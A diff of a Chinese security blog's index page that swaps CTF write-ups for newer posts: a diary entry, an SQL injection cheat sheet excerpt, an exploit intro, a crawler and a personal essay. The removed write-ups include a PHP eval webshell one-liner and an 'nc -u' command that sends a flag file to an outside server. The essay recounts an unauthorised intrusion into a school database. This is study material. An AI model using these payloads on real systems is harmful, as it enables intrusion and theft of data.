@@ -18,17 +18,17 @@
     
 
 
-<meta name="description" content="记录安全相关的琐碎，也会有开发方面的知识。">
+<meta name="description" content="记录安全相关的琐碎">
 <meta name="keywords" content="安全 编程 开发 博客">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Jayl1n&#39;s Blog">
-<meta property="og:url" content="http://Jayl1n.github.io/page/2/index.html">
+<meta property="og:url" content="https://jayl1n.github.io/page/2/index.html">
 <meta property="og:site_name" content="Jayl1n&#39;s Blog">
-<meta property="og:description" content="记录安全相关的琐碎，也会有开发方面的知识。">
+<meta property="og:description" content="记录安全相关的琐碎">
 <meta property="og:locale" content="zh-Hans">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Jayl1n&#39;s Blog">
-<meta name="twitter:description" content="记录安全相关的琐碎，也会有开发方面的知识。">
+<meta name="twitter:description" content="记录安全相关的琐碎">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -283,11 +283,11 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-summary-fileupload-bypass" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-daily-life-20180909" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/post/summary-fileupload-bypass/" class="article-date">
-      <time datetime="2018-09-18T09:52:50.000Z" itemprop="datePublished">2018-09-18</time>
+      <a href="/2018/09/09/daily-life-20180909/" class="article-date">
+      <time datetime="2018-09-09T15:14:15.000Z" itemprop="datePublished">2018-09-09</time>
 </a>
 
 
@@ -302,7 +302,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/post/summary-fileupload-bypass/">文件上传绕过的各种姿势</a>
+      <a class="article-title" href="/2018/09/09/daily-life-20180909/">日常心路-180909</a>
     </h1>
   
 
@@ -312,20 +312,86 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-              <ol>
-<li><p>JS前端检测</p>
-<ul>
-<li><p>浏览器审核元素，修改代码</p>
+        <p>最近忙了很多事，从公司离职，搬家，开学，又跑到某市做培训。</p>
+<p>突然回到校园生活，身份从社会人变成学生，感觉还有点不适应。</p>
+<p>今天，如愿以偿的通过了<code>Syclover</code>的面试，进入了新芽组，应该是唯一一个大三的新芽 ( ╯□╰ )，不过也算是完成了高中时候的心愿（进入CUIT，进入Syclover）。今天面的师傅很严肃，感觉自己确实还差的太多了，希望能在这个学期努力跟上。</p>
+<p>这个学期，需要额外补<code>3</code>门课，把四级过了，还要尽量通过核心组面试，任务挺重的⊙﹏⊙∥。</p>
+<p>诸君共勉吧(ﾉ*･ω･)ﾉ。</p>
+<p><img src="daily-life-20180909/jldnydhgjxzpmdzj.jpg" alt="表情"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/心路/">心路</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日常/">日常</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-sql-injection-cheat-sheet" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/08/07/sql-injection-cheat-sheet/" class="article-date">
+      <time datetime="2018-08-07T05:48:11.000Z" itemprop="datePublished">2018-08-07</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/07/sql-injection-cheat-sheet/">SQL注入备忘录</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p>转自：<a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p>
+<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h3><ul>
+<li><p><code>--</code> (MySQL | SQLServer)</p>
+<p>DROP sample; –</p>
 </li>
-<li><p>BP抓包，修改后缀</p>
+<li><p><code>#</code> (MySQL)</p>
+<p>DROP sample; #</p>
 </li>
 </ul>
+<h4 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h4><ul>
+<li><p>Username: admin’–</p>
 </li>
-<li><p>文件后缀绕过</p>
-<p> Apache 的配置文件 <code>httpd.conf</code>,配置了哪些后缀会当作 <code>php</code> 脚本来解析，只要上传支持的后缀就行。</p>
-   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>
+<li><p>SELECT * FROM members WHERE username = ‘admin’–’ AND password = ‘password’ </p>
 </li>
-</ol>
+</ul>
           
       
     </div>
@@ -336,12 +402,12 @@
 
       
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql-injection/">sql-injection</a></li></ul>
     </div>
 
       
         <p class="article-more-link">
-          <a href="/post/summary-fileupload-bypass/#more">阅读全文 >></a>
+          <a href="/2018/08/07/sql-injection-cheat-sheet/#more">阅读全文 >></a>
         </p>
       
       <div class="clearfix"></div>
@@ -360,11 +426,11 @@
 
 
   
-    <article id="post-ichunqiu-web-BLOG" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-exploit-erraticgopher" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/post/ichunqiu-web-BLOG/" class="article-date">
-      <time datetime="2018-09-11T09:37:52.000Z" itemprop="datePublished">2018-09-11</time>
+      <a href="/2018/08/02/exploit-erraticgopher/" class="article-date">
+      <time datetime="2018-08-02T01:20:48.000Z" itemprop="datePublished">2018-08-02</time>
 </a>
 
 
@@ -379,7 +445,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/post/ichunqiu-web-BLOG/">i春秋-Web-BLOG</a>
+      <a class="article-title" href="/2018/08/02/exploit-erraticgopher/">远程溢出之古怪地鼠ERRATICGOPHER</a>
     </h1>
   
 
@@ -389,7 +455,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-              <p>一个BLOG，注册后登录，发现使用了 <code>kindeditor 4.1.10</code> 编辑器，这个编辑器存在目录遍历漏洞，访问 <code>/kindeditor/php/file_manager_json.php?path=../</code>，会泄露目录内文件。</p>
+              <p>ERRATICGOPHER是NSA泄露的针对<code>RRAS（Routing and Remote Access Service）</code>服务的攻击程序，影响<code>Windows XP</code> <code>Windows 2003</code>，此漏洞在<code>Vista</code>发布之前已经被修复。</p>
           
       
     </div>
@@ -400,12 +466,12 @@
 
       
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/BLOG/">BLOG</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/EXPLOIT/">EXPLOIT</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SMB/">SMB</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/远程溢出/">远程溢出</a></li></ul>
     </div>
 
       
         <p class="article-more-link">
-          <a href="/post/ichunqiu-web-BLOG/#more">阅读全文 >></a>
+          <a href="/2018/08/02/exploit-erraticgopher/#more">阅读全文 >></a>
         </p>
       
       <div class="clearfix"></div>
@@ -424,11 +490,11 @@
 
 
   
-    <article id="post-ichunqiu-web-Upload" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-crawl-admin5" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/post/ichunqiu-web-Upload/" class="article-date">
-      <time datetime="2018-09-11T09:13:43.000Z" itemprop="datePublished">2018-09-11</time>
+      <a href="/2018/08/01/crawl-admin5/" class="article-date">
+      <time datetime="2018-08-01T01:45:40.000Z" itemprop="datePublished">2018-08-01</time>
 </a>
 
 
@@ -443,7 +509,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/post/ichunqiu-web-Upload/">ichunqiu-web-Upload</a>
+      <a class="article-title" href="/2018/08/01/crawl-admin5/">爬虫之批量下载Admin5源码</a>
     </h1>
   
 
@@ -453,149 +519,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>上传题，可以直接上传 <code>php</code> 脚本，但是会过滤 <code>&lt;?</code>，<code>php</code>，把它们替换为空，所以一般的 <code>php</code> 脚本都无法执行。</p>
-<p>网上找了个特殊的一句话。</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"pHp"</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">'cmd'</span>])&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p>菜刀连接，成功拿到 <code>shell</code>。</p>
-<p><img src="/post/ichunqiu-web-Upload/flag.png" alt="flag"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Upload/">Upload</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-ichunqiu-web-EXEC" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/post/ichunqiu-web-EXEC/" class="article-date">
-      <time datetime="2018-09-11T08:35:23.000Z" itemprop="datePublished">2018-09-11</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/post/ichunqiu-web-EXEC/">i春秋-Web-EXEC</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>根据提示，是一道命令执行的题。</p>
-<p>打开以后，提示 <code>no sign</code> ，未登录。</p>
-<p>查看源码，看到 <code>meta</code> 信息里有提示，使用了 <code>vim</code>。猜测可能存在 <code>swp</code> 文件泄露。</p>
-<p>直接访问 <code>.index.php.swp</code> ，成功下载。</p>
-<p>使用命令 <code>vim -r .index.php.swp</code> ，恢复文件，获得以下内容。</p>
-<p>整理内容，得到以下代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;blind cmd exec&lt;/title&gt;</span><br><span class="line">&lt;meta language=<span class="string">'utf-8'</span> editor=<span class="string">'vim'</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;img src=pic.gif&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">flag in flag233.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">'1'</span>);</span><br><span class="line">        $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;</span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">'11259375'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">        setcookie(<span class="string">'auth'</span>,<span class="string">'tcp tunnel is forbidden!'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">                $command=$_POST[cmd];</span><br></pre></td></tr></table></figure>
-<p>分析代码，知道需要通过 <code>GET</code> 传入一个 <code>sign</code>参数 ，必须和 <code>11259375</code> 相等，同时参数的每个字符都不能在 <code>1-9</code>之间。</p>
-<p>这里用的是 <code>==</code> ，所以可以传入 <code>0xabcdef</code> 绕过。</p>
-<p>通过外层 <code>if</code> 后，提示 <code>tcp 通道不能使用</code>，然后会执行 <code>cmd</code> 参数的命令。</p>
-<p>这里需要一台服务器监听一个 <code>udp</code> 端口，可以用 <code>nc</code> 实现，</p>
-<blockquote>
-<p>nc -ul 8989</p>
-</blockquote>
-<p><img src="/post/ichunqiu-web-EXEC/bp.png" alt="bp"></p>
-<p>传入 <code>cmd=nc -u 服务器地址 端口 &lt; flag233.php</code>，服务器就能接收到 <code>flag233.php</code> 的内容。</p>
-<p><img src="/post/ichunqiu-web-EXEC/flag.png" alt="flag"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-ichunqiu-web-SQLi" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/post/ichunqiu-web-SQLi/" class="article-date">
-      <time datetime="2018-09-10T05:30:38.000Z" itemprop="datePublished">2018-09-10</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/post/ichunqiu-web-SQLi/">i春秋-Web-SQLi</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>一道注入题，登录页面。</p>
-<p>试了常见的万能密码，无效，不存在弱口令。</p>
-<p>使用BP，看下过滤了哪些字符。</p>
+              <h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p><a href="http://down.admin5.com" target="_blank" rel="noopener"><code>Admin5</code></a> 提供了各种语言的开源项目，包括<code>asp</code> <code>php</code> <code>.net</code> <code>jsp</code>等。最近开始玩代码审计，到处找项目很麻烦，所以打算写一个爬虫，借助Admin5批量下载各类开源项目。</p>
           
       
     </div>
@@ -606,13 +530,79 @@
 
       
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/爬虫/">爬虫</a></li></ul>
     </div>
 
       
         <p class="article-more-link">
-          <a href="/post/ichunqiu-web-SQLi/#more">阅读全文 >></a>
+          <a href="/2018/08/01/crawl-admin5/#more">阅读全文 >></a>
         </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-yesterday-and-tomorrow" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/07/31/yesterday-and-tomorrow/" class="article-date">
+      <time datetime="2018-07-31T12:57:12.000Z" itemprop="datePublished">2018-07-31</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/07/31/yesterday-and-tomorrow/">昨天，明天</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>在二零一八年七月的尾巴，写下这篇文章。算是对过去的一个回忆总结，还有未来的计划。</p>
+<p>做安全，是我高中时候就有的想法。那个时候WooYun还在，我还记得曾经挖到一个小厂的任意用户密码重置的漏洞，注册了第一个账号，踏上了我在安全路上的第一步。</p>
+<p>高中的时候住校，手机查的还严。每天最开心的就是窝在被子里，翻着WooYun，逛逛Zone。看看今天谁家Struts2的洞还没补，哪个厂的裤子又被脱了。当然，还有各路大佬分享的奇技淫巧，一哥猪猪侠，画漫画的小川……</p>
+<p>大学，我来到离家1500KM的成都，因为各种原因，选了一个不喜欢的专业，加了学生会，每天都让自己很忙，常常是通宵在工作，也没有时间再去关注安全圈。第一个学期的学期末，重要的几门专业基础课还是都不懂。我意识到这个专业真的不适合我，即使毕业了，我也不会去做这行。某个晚上，我扯出路由器上的网线，连上学校内网，拿下了支撑学校核心业务的数据库。表里，挂掉的两科静静的躺在那，只要我敲下键盘，就是全班最佳。思考了许久，还是关掉了终端。理智战胜了贪欲，假的永远不会真，做了假，就要每天担心谎言会在哪天被拆穿。</p>
+<p>第二个学期，不顾家人反对，我转到了软件专业，学习软件开发。环境原因，班上的计算机水平都不行，凭着高中攒下的知识，吊打全专业。不过这没什么好比的，格局要大。我开始参加各种比赛，移动开发，大数据，软件杯。一路过来，经历了很多，承担了很多，收获了很多，可以说是我人生成长最多的历程。在这里，我迷失过，特别是我深入开发之后，我发现IT的方向原来这么多，我对每个方向都感兴趣，但一个人不可能把每条路走通，必须找一条合适自己路。开发这条路，我走了很久，也做过自己引以为傲的作品。不过我不喜欢做业务，像是搬砖一样的堆砌代码，写没有灵魂的程序，所以，是时候回去了。</p>
+<p>这一年，最开心的事莫过于通过升本考试，接下来的两年，我将在CUIT继续学习。CUIT最出名的，就是信息安全了吧，也是牛人云集的地方。希望多年以后，再看这篇文章的时候，我也是一枚大佬了。</p>
+<p>不忘初心，方得始终。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/心路/">心路</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/日常/">日常</a></li></ul>
+    </div>
+
       
       <div class="clearfix"></div>
     </div>
@@ -632,7 +622,7 @@
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
     </nav>
   
 </div>
@@ -644,7 +634,7 @@
                 2018 Jayl1n
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
             </div>
         </div>
         
@@ -668,10 +658,27 @@
         
     </div>
 </footer>
+
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/31/2018 00:00:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
     </div>
     
-            <script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
-            
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
     <script>
         $(document).ready(function() {
             var iPad = window.navigator.userAgent.indexOf('iPad');
@@ -688,16 +695,16 @@
         })
     </script>
 
-                
-                    
 
-                        
-                                    <div class="scroll" id="scroll">
+
+
+
+<div class="scroll" id="scroll">
     <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
     <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
     <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
 </div>
-                                        <script>
+<script>
     // Open in New Window
     
         var oOpenInNew = {
@@ -718,9 +725,9 @@
         }
     
 </script>
-                                            
-                                                <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
-                                                </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
   </div>
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":75,"height":150},"mobile":{"show":true}});</script></body>
 </html>
